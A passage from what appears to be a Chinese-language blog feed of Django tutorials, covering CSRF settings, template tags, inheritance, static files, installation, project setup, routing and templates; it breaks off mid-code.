class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在settings中设置</span></span><br><span class="line">MIDDLEWARE = [</span><br><span class="line"> <span class="string">&#x27;django.middleware.security.SecurityMiddleware&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;django.middleware.common.CommonMiddleware&#x27;</span>,</span><br><span class="line"> <span class="comment">#&#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;,</span></span><br><span class="line"> <span class="string">&#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>局部禁⽤csrf:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在不想检验csrf的视图函数前添加装饰器@csrf_exempt。</span></span><br><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt,csrf_protect</span><br><span class="line"><span class="meta">@csrf_exempt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csrf1</span>(<span class="params">request</span>):</span><br><span class="line"> <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ajax验证csrf:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Ajax提交数据时候，携带CSRF：</span><br><span class="line">a. 放置在data中携带</span><br><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;/csrf1.html&quot;</span>&gt;</span><br><span class="line"> &#123;% csrf_token %&#125;</span><br><span class="line"> &lt;<span class="built_in">input</span> <span class="built_in">id</span>=<span class="string">&quot;username&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line"> &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>/&gt;</span><br><span class="line"> &lt;a onclick=<span class="string">&quot;submitForm();&quot;</span>&gt;Ajax提交&lt;/a&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;/static/jquery-1.12.4.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"> function submitForm()&#123;</span><br><span class="line"> var csrf = $(<span class="string">&#x27;input[name=&quot;csrfmiddlewaretoken&quot;]&#x27;</span>).val();</span><br><span class="line"> var user = $(<span class="string">&#x27;#user&#x27;</span>).val();</span><br><span class="line"> $.ajax(&#123;</span><br><span class="line"> url: <span class="string">&#x27;/csrf1.html&#x27;</span>,</span><br><span class="line"> <span class="built_in">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"> data: &#123; <span class="string">&quot;user&quot;</span>:user,<span class="string">&#x27;csrfmiddlewaretoken&#x27;</span>: csrf&#125;,</span><br><span class="line"> success:function(arg)&#123;</span><br><span class="line"> console.log(arg);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;)</span><br><span class="line"> &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><p>csrf的意义在于 给每⼀个表单都设置⼀个唯⼀的csrf的值 并且cookie也存储⼀份 当提交表单过来的时候 判断cookie中的值 和csrf_token中的值 是否都为本⽹站⽣ 成的 如果验证通过则提交 否则 403</p><ol start="6"><li>模板导⼊标签（ include）</li></ol><p>可以把指定html⽂件代码导⼊到当前⽂件，实现模板代码的复⽤&#x2F;重⽤。语法格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include <span class="string">&#x27;路径/xxx.html&#x27;</span> %&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>url标签</li></ol><p>在模板中url标签可⽤于反向解析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;&lt;a href=<span class="string">&quot;&#123;% url &#x27;App:index&#x27; %&#125;&quot;</span>&gt;动态⽣成路由地址不带参的跳转&lt;/a&gt;</span><br><span class="line">&lt;/h2&gt;</span><br><span class="line">&lt;h2&gt;&lt;a href=<span class="string">&quot;&#123;% url &#x27;App:args1&#x27; 1 2 %&#125;&quot;</span>&gt;动态⽣成路由地址带参的跳转&lt;/a&gt;</span><br><span class="line">&lt;/h2&gt;</span><br><span class="line">&lt;h2&gt;&lt;a href=<span class="string">&quot;&#123;% url &#x27;App:args1&#x27; num1=1 num2=2 %&#125;&quot;</span>&gt;动态⽣成路由地址带关</span><br><span class="line">键字参数的跳转&lt;/a&gt;&lt;/h2&gt;</span><br></pre></td></tr></table></figure><h2 id="Django-模板继承"><a href="#Django-模板继承" class="headerlink" title="Django 模板继承"></a>Django 模板继承</h2>在整个⽹站中，如何减少共⽤⻚⾯区域（⽐如站点导航）所引起的重复和冗余代 码？Django 解决此类问题的⾸选⽅法是使⽤⼀种优雅的策略—— 模板继承 。本质上来说，模板继承就是先构造⼀个基础框架模板，⽽后在其⼦模板中对它所包 含站点公⽤部分和定义块进⾏重载。 - {% extends "父模板路径" %} 继承⽗模板  - {% block %} ⼦模板可以重载这部分内容 - {{ block.super }}调⽤⽗模板的代码使⽤继承的⼀种常⻅⽅式是下⾯的三层法: - 创建base.html模板，在其中定义站点的主要外观感受。这些都是不常修改甚 ⾄从不修改的部分。  - 为每种类型的⻚⾯创建独⽴的模板，例如论坛⻚⾯或者图⽚库。这些模板拓展 相应的区域模板。  - ⾃⼰的⻚⾯继承⾃模板，覆盖⽗模板中指定block注意事项： -  如果在模板中使⽤ {% extends %} ，必须保证其为模板中的第⼀个模板标记。 否则，模板继承将不起作⽤。 - ⼀般来说，基础模板中的 {% block %} 标签越多越好。 -  如果发觉⾃⼰在多个模板之间有重复代码，你应该考虑将该代码放置到⽗模板 的某个 {% block %} 中。 不在同⼀个模板中定义多个同名的 {% block %} 。  -  多数情况下， {% extends %} 的参数应该是字符，但是如果直到运⾏时⽅能确 定⽗模板名称，这个参数也 可以是个变量。<h2 id="Django-静态资源配置"><a href="#Django-静态资源配置" class="headerlink" title="Django 静态资源配置"></a>Django 静态资源配置</h2><p>什么是静态资源：css、js、images 需要从外部导⼊的资源 </p><h3 id="创建static⽂件夹"><a href="#创建static⽂件夹" class="headerlink" title="创建static⽂件夹"></a>创建static⽂件夹</h3><p>在项目根目录下创建个static文件夹，用来存储css、js、images等静态资源。</p><h3 id="在settings注册"><a href="#在settings注册" class="headerlink" title="在settings注册"></a>在settings注册</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL = <span class="string">&#x27;/static/&#x27;</span></span><br><span class="line">STATICFILES_DIRS = [</span><br><span class="line">    os.path.join(BASE_DIR,<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="在模板中使⽤静态资源"><a href="#在模板中使⽤静态资源" class="headerlink" title="在模板中使⽤静态资源"></a>在模板中使⽤静态资源</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;  <span class="comment">#放置到模板开头 </span></span><br><span class="line">&lt;img src=<span class="string">&quot;/static/img/img.jpeg&quot;</span> alt=<span class="string">&quot;&quot;</span>&gt;  <span class="comment">#硬编码 </span></span><br><span class="line">&lt;img src=<span class="string">&quot;&#123;% static &#x27;img/img.jpeg&#x27; %&#125;&quot;</span> alt=<span class="string">&quot;&quot;</span>&gt;  <span class="comment">#动态写法，建议⽤这种</span></span><br></pre></td></tr></table></figure><h2 id="Django-系列文章"><a href="#Django-系列文章" class="headerlink" title="Django 系列文章"></a>Django 系列文章</h2><p>Django基础学习：<a href="https://www.xpctf.cn/posts/24c5/">https://www.xpctf.cn/posts/24c5/</a><br>Django晋级学习：<a href="https://www.xpctf.cn/posts/2f99/">https://www.xpctf.cn/posts/2f99/</a><br>Django模型学习：<a href="https://www.xpctf.cn/posts/d0b4/">https://www.xpctf.cn/posts/d0b4/</a><br>Django会话学习：<a href="https://www.xpctf.cn/posts/7490/">https://www.xpctf.cn/posts/7490/</a><br>Django Form学习：正在写</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django基础学习</title>
      <link href="/posts/24c5/"/>
      <url>/posts/24c5/</url>
      
        <content type="html"><![CDATA[<h2 id="Django-简介"><a href="#Django-简介" class="headerlink" title="Django 简介"></a>Django 简介</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>Django 是一个由 Python 编写的一个开放源代码的 Web 应用框架。</p><p>使用 Django，只要很少的代码，Python 的程序开发人员就可以轻松地完成一个正式网站所需要的大部分内容，并进一步开发出全功能的 Web 服务 Django 本身基于 MVC 模型，即 Model（模型）+ View（视图）+ Controller（控制器）设计模式，MVC 模式使后续对程序的修改和扩展简化，并且使程序某一部分的重复利用成为可能。</p><ul><li>低耦合</li><li>开发快捷</li><li>部署方便</li><li>可重用性高</li><li>维护成本低</li><li>…</li></ul><p>Python 加 Django 是快速开发、设计、部署网站的最佳组合。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>强大的数据库功能</li><li>自带强大的后台功能</li><li>优雅的网址</li></ul><h3 id="MVC-与-MTV模型"><a href="#MVC-与-MTV模型" class="headerlink" title="MVC 与 MTV模型"></a>MVC 与 MTV模型</h3><h3 id="MVC-模型"><a href="#MVC-模型" class="headerlink" title="MVC 模型"></a>MVC 模型</h3><p>MVC 模式（Model–view–controller）是软件工程中的一种软件架构模式，把软件系统分为三个基本部分：模型（Model）、视图（View）和控制器（Controller）。</p><p>MVC 以一种插件式的、松耦合的方式连接在一起。</p><ul><li>模型（M）- 编写程序应有的功能，负责业务对象与数据库的映射(ORM)。</li><li>视图（V）- 图形界面，负责与用户的交互(页面)。</li><li>控制器（C）- 负责转发请求，对请求进行处理。</li></ul><p>简易图：</p><p><img src="https://img.xpctf.cn/img/20201011203655.png"></p><p>用户操作流程图：</p><p><img src="https://img.xpctf.cn/img/20201011203751.png"></p><h3 id="MTV-模型"><a href="#MTV-模型" class="headerlink" title="MTV 模型"></a>MTV 模型</h3><p>Django 的 MTV 模式本质上和 MVC 是一样的，也是为了各组件间保持松耦合关系，只是定义上有些许不同，Django 的 MTV 分别是指：</p><ul><li>M 表示模型（Model）：编写程序应有的功能，负责业务对象与数据库的映射(ORM)。</li><li>T 表示模板 (Template)：负责如何把页面(html)展示给用户。</li><li>V 表示视图（View）：负责业务逻辑，并在适当时候调用 Model和 Template。</li></ul><p>除了以上三层之外，还需要一个 URL 分发器，它的作用是将一个个 URL 的页面请求分发给不同的 View 处理，View 再调用相应的 Model 和 Template，MTV 的响应模式如下所示：</p><p>简易图：</p><p><img src="https://www.runoob.com/wp-content/uploads/2020/05/MTV-Diagram.png" alt="img"></p><p>用户操作流程图：</p><p><img src="https://www.runoob.com/wp-content/uploads/2020/05/1589777036-2760-fs1oSv4dOWAwC5yW.png" alt="img"></p><p><strong>解析：</strong></p><p>用户通过浏览器向我们的服务器发起一个请求(request)，这个请求会去访问视图函数：</p><ul><li>a.如果不涉及到数据调用，那么这个时候视图函数直接返回一个模板也就是一个网页给用户。</li><li>b.如果涉及到数据调用，那么视图函数调用模型，模型去数据库查找数据，然后逐级返回。</li></ul><p>视图函数把返回的数据填充到模板中空格中，最后返回网页给用户。</p><h2 id="Django-安装"><a href="#Django-安装" class="headerlink" title="Django 安装"></a>Django 安装</h2><p>在安装 Django 前，系统需要已经安装了Python的开发环境。接下来我们来具体看下不同系统下Django的安装。</p><h3 id="Window-下安装-Django"><a href="#Window-下安装-Django" class="headerlink" title="Window 下安装 Django"></a>Window 下安装 Django</h3><p>如果你还未安装Python环境需要先下载Python安装包。</p><p>1、Python 下载地址：<a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></p><p>2、Django 下载地址：<a href="https://www.djangoproject.com/download/">https://www.djangoproject.com/download/</a></p><p><strong>注意：</strong>目前 Django 2.2.x 以上版本已经完全兼容 Python 3.x。</p><h3 id="Python-安装-已安装的可跳过"><a href="#Python-安装-已安装的可跳过" class="headerlink" title="Python 安装(已安装的可跳过)"></a>Python 安装(已安装的可跳过)</h3><p>安装 Python 你只需要下载 python-x.x.x.msi 文件，然后一直点击 “Next” 按钮即可。</p><p><img src="https://www.runoob.com/wp-content/uploads/2015/01/install1.png" alt="img"></p><h3 id="Django-安装-1"><a href="#Django-安装-1" class="headerlink" title="Django 安装"></a>Django 安装</h3><p>使用pip安装Django即可,加-i参数使用阿里云的pipy源,速度快.<br>命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Django==2.2 -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure><h3 id="检查是否安装成功"><a href="#检查是否安装成功" class="headerlink" title="检查是否安装成功"></a>检查是否安装成功</h3><p>输入以下命令进行检查:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import django</span><br><span class="line">&gt;&gt;&gt; django.get_version()</span><br><span class="line">&#x27;2.2&#x27;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>如果输出了Django的版本号说明安装正确。</p><h2 id="Django-创建项目"><a href="#Django-创建项目" class="headerlink" title="Django 创建项目"></a>Django 创建项目</h2><p>本章我们将介绍Django 管理工具及如何使用 Django 来创建项目，第一个项目我们以 HelloWorld 来命令项目。</p><p>测试版本说明：</p><ul><li>Python 3.6.8</li><li>Django 2.2</li></ul><h3 id="Django-管理工具"><a href="#Django-管理工具" class="headerlink" title="Django 管理工具"></a>Django 管理工具</h3><p>安装 Django 之后，您现在应该已经有了可用的管理工具 django-admin.py，Windows 如果没有配置环境变量可以用 django-admin。</p><p>我们可以使用 django-admin.py 来创建一个项目:<br>我们可以来看下django-admin 的命令介绍:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">Type</span> &#x27;django-admin <span class="built_in">help</span> &lt;subcommand&gt;&#x27; <span class="keyword">for</span> <span class="built_in">help</span> on a specific subcommand.</span><br><span class="line"></span><br><span class="line">Available subcommands:</span><br><span class="line"></span><br><span class="line">[django]</span><br><span class="line">    check</span><br><span class="line">    compilemessages</span><br><span class="line">    createcachetable</span><br><span class="line">    dbshell</span><br><span class="line">    diffsettings</span><br><span class="line">    dumpdata</span><br><span class="line">    flush</span><br><span class="line">    inspectdb</span><br><span class="line">    loaddata</span><br><span class="line">    makemessages</span><br><span class="line">    makemigrations</span><br><span class="line">    migrate</span><br><span class="line">    runserver</span><br><span class="line">    sendtestemail</span><br><span class="line">    shell</span><br><span class="line">    showmigrations</span><br><span class="line">    sqlflush</span><br><span class="line">    sqlmigrate</span><br><span class="line">    sqlsequencereset</span><br><span class="line">    squashmigrations</span><br><span class="line">    startapp</span><br><span class="line">    startproject</span><br><span class="line">    test</span><br><span class="line">    testserver</span><br></pre></td></tr></table></figure><h3 id="Django-创建项目-1"><a href="#Django-创建项目-1" class="headerlink" title="Django 创建项目"></a>Django 创建项目</h3><p>使用 django-admin 来创建 Hello 项目：</p><blockquote><p>django-admin startproject Hello</p></blockquote><p>使用tree &#x2F;F来查看目录结构：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">tree</span> /F</span><br><span class="line"><span class="function">D:.</span></span><br><span class="line"><span class="function">│  <span class="title">manage.py</span></span></span><br><span class="line"><span class="function">│</span></span><br><span class="line"><span class="function">└─<span class="title">Hello</span></span></span><br><span class="line"><span class="function">        <span class="title">settings.py</span></span></span><br><span class="line"><span class="function">        <span class="title">urls.py</span></span></span><br><span class="line"><span class="function">        <span class="title">wsgi.py</span></span></span><br><span class="line"><span class="function">        <span class="title">__init__.py</span></span></span><br></pre></td></tr></table></figure><p>目录说明：</p><ul><li><strong>HelloWorld:</strong> 项目的容器。</li><li><strong>manage.py:</strong> 一个实用的命令行工具，可让你以各种方式与该 Django 项目进行交互。</li><li><strong>HelloWorld&#x2F;<strong>init</strong>.py:</strong> 一个空文件，告诉 Python 该目录是一个 Python 包。</li><li><strong>HelloWorld&#x2F;settings.py:</strong> 该 Django 项目的设置&#x2F;配置。</li><li><strong>HelloWorld&#x2F;urls.py:</strong> 该 Django 项目的 URL 声明; 一份由 Django 驱动的网站”目录”。</li><li><strong>HelloWorld&#x2F;wsgi.py:</strong> 一个 WSGI 兼容的 Web 服务器的入口，以便运行你的项目。</li></ul><p>接下来我们进入 Hello 目录输入以下命令，启动服务器：</p><blockquote><p>py -3 manage.py runserver 0.0.0.0:8000</p></blockquote><p>0.0.0.0 让其它电脑可连接到开发服务器，8000 为端口号。如果不说明，那么端口号默认为 8000。<br>在浏览器输入你服务器的 ip（这里我们输入本机 IP 地址： 127.0.0.1:8000） 及端口号，如果正常启动，输出结果如下：<br><img src="https://img.xpctf.cn/img/20201012123556.png"></p><h3 id="Django-创建应用"><a href="#Django-创建应用" class="headerlink" title="Django 创建应用"></a>Django 创建应用</h3><p>使用<code>py -3 manage.py startapp App</code>创建一个应用，<br>目录结构：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Users</span>\<span class="title">Administrator</span>\<span class="title">Desktop</span>\<span class="title">django</span>\<span class="title">Hello</span>&gt;<span class="title">tree</span> <span class="title">App</span> /<span class="title">F</span></span></span><br><span class="line"><span class="function">卷 软件 的文件夹 <span class="title">PATH</span> 列表</span></span><br><span class="line"><span class="function">卷序列号为 2901-4<span class="title">EB1</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">USERS</span>\<span class="title">ADMINISTRATOR</span>\<span class="title">DESKTOP</span>\<span class="title">DJANGO</span>\<span class="title">HELLO</span>\<span class="title">APP</span></span></span><br><span class="line"><span class="function">│  <span class="title">admin.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">apps.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">models.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">tests.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">views.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">__init__.py</span></span></span><br><span class="line"><span class="function">│</span></span><br><span class="line"><span class="function">└─<span class="title">migrations</span></span></span><br><span class="line"><span class="function">        <span class="title">__init__.py</span></span></span><br></pre></td></tr></table></figure><h3 id="Django-项目配置"><a href="#Django-项目配置" class="headerlink" title="Django 项目配置"></a>Django 项目配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">BASE_DIR#项目路径</span><br><span class="line">SECRET_KEY#签名key</span><br><span class="line">DEBUG#调试模式</span><br><span class="line">ALLOWED_HOSTS#允许访问列表 ALLOWED_HOSTS = [&#x27;*&#x27;] #允许所有访问</span><br><span class="line">INSTALLED_APPS#安装应用 自己创建的应用需要加入到该列表，应用名即可</span><br><span class="line">MIDDLEWARE#中间件</span><br><span class="line">ROOT_URLCONF#根路由 Django中各个应用有个路由</span><br><span class="line">TEMPLATES#模板配置</span><br><span class="line">BACKEND#模板引擎</span><br><span class="line">DIRS#模板路径</span><br><span class="line">WSGI_APPLICATION#项目入口</span><br><span class="line">DATABASES#数据库配置</span><br><span class="line">AUTH_PASSWORD_VALIDATORS#访问验证</span><br><span class="line">LANGUAGE_CODE = &#x27;zh-hans&#x27;#简体中文语言</span><br><span class="line">TIME_ZONE = &#x27;Asia/Shanghai&#x27;#上海时区</span><br><span class="line">USE_TZ = False#不适用国际标准时间</span><br><span class="line">STATIC_URL#静态资源请求路径</span><br></pre></td></tr></table></figure><p>设置后继续runserver，默认界面变成中文显示。<br><img src="https://img.xpctf.cn/img/20201012132637.png"></p><h3 id="自定义主页"><a href="#自定义主页" class="headerlink" title="自定义主页"></a>自定义主页</h3><p>修改urls.py文件，在urlpatterns列表里增加<code>path(&#39;&#39;,views.index,name=&#39;index&#39;)</code>，在views.py定义index函数:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello World&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="pycharm创建项目"><a href="#pycharm创建项目" class="headerlink" title="pycharm创建项目"></a>pycharm创建项目</h3><p>File&#x3D;&gt;New project&#x3D;&gt;Django&#x3D;&gt;配置项目路径&#x3D;&gt;配置Python路径&#x3D;&gt;配置模板&#x3D;&gt;配置应用名称&#x3D;&gt;create<br><img src="https://img.xpctf.cn/img/20201012134758.png"></p><h2 id="Django-路由"><a href="#Django-路由" class="headerlink" title="Django 路由"></a>Django 路由</h2><h3 id="创建子路由"><a href="#创建子路由" class="headerlink" title="创建子路由"></a>创建子路由</h3><p>Hello目录下的路由是根路由，每个应用都可以有自己的路由，应用路由互相不影响。</p><p>在应用目录新建urls.py文件，写入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path <span class="comment">#导入path模块</span></span><br><span class="line"><span class="keyword">from</span> App <span class="keyword">import</span> views   <span class="comment">#导入应用views文件</span></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;home/&#x27;</span>,views.home,name=<span class="string">&#x27;home&#x27;</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在views.py里定义函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Home&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在根路由列表里包含子路由列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line">path(<span class="string">&#x27;&#x27;</span>,include(<span class="string">&quot;App.urls&quot;</span>))</span><br></pre></td></tr></table></figure><p>pycharm技巧：选中views按Alt+Enter键可以导入快速导入模块，选中home可以自动生成home函数。</p><h2 id="Django-模板和模型"><a href="#Django-模板和模型" class="headerlink" title="Django 模板和模型"></a>Django 模板和模型</h2><h3 id="设置模型路径"><a href="#设置模型路径" class="headerlink" title="设置模型路径"></a>设置模型路径</h3><p>在Hello目录下载新建templates文件夹，用来存储模板，修改settings.py的TEMPLATES列表下的DIRS值为[os.path.join(BASE_DIR, ‘templates’)]。<br><img src="https://img.xpctf.cn/img/20201012163739.png"></p><h3 id="新建模型"><a href="#新建模型" class="headerlink" title="新建模型"></a>新建模型</h3><p>在templates文件夹中新建index.html文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh_cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Hello, &#123;&#123; name &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong>模板文件中不能出现中文</p><h3 id="使用模板"><a href="#使用模板" class="headerlink" title="使用模板"></a>使用模板</h3><p>render是Django提供的一个渲染Html的模块<br>request是一个固定参数, 没什么好讲的<br>index.html是模板文件<br>context是要传入文件中用于渲染呈现的数据, 默认是字典格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>(<span class="params">request</span>):</span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>:<span class="string">&#x27;Django&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;china&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&quot;index.html&quot;</span>,context=context)</span><br></pre></td></tr></table></figure><h3 id="连接sqllite3数据库"><a href="#连接sqllite3数据库" class="headerlink" title="连接sqllite3数据库"></a>连接sqllite3数据库</h3><p>如果pycharm是专业版，点击最右边的database选项，在弹出的界面选择data source，找到SQLlite数据库，按照下图配置即可。<br><img src="https://img.xpctf.cn/img/20201012170716.png"></p><h3 id="新建模型-1"><a href="#新建模型-1" class="headerlink" title="新建模型"></a>新建模型</h3><p>创建User类，继承models.Model属性，创建UserName和PassWord列名，并指定表名。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 